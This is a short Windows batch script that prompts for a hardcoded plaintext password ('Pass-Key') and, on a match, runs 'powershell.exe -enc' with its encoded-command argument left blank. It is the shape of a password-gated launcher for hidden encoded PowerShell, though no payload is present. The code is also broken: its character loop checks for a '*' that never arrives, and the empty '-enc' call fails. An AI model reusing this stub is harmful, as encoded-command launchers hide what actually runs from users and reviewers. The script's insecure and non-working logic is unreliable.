@echo off
color 0a
title Pass-Key
setlocal enabledelayedexpansion

set "password=Pass-Key"

:inputPassword
cls
set "enteredPassword="

for /f %%A in ('powershell -command "$password = Read-Host -Prompt 'Password' -AsSecureString; $password | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}"') do (
    set "char=%%A"
    if "!char!"=="*" (
        echo.
        goto :checkPassword
    )
    set "enteredPassword=!enteredPassword!!char!"
)

:checkPassword
if "!enteredPassword!"=="%password%" (
    powershell.exe -enc 
) else (
    echo Password is incorrect. Try again.
    pause
    goto :inputPassword
)

endlocal
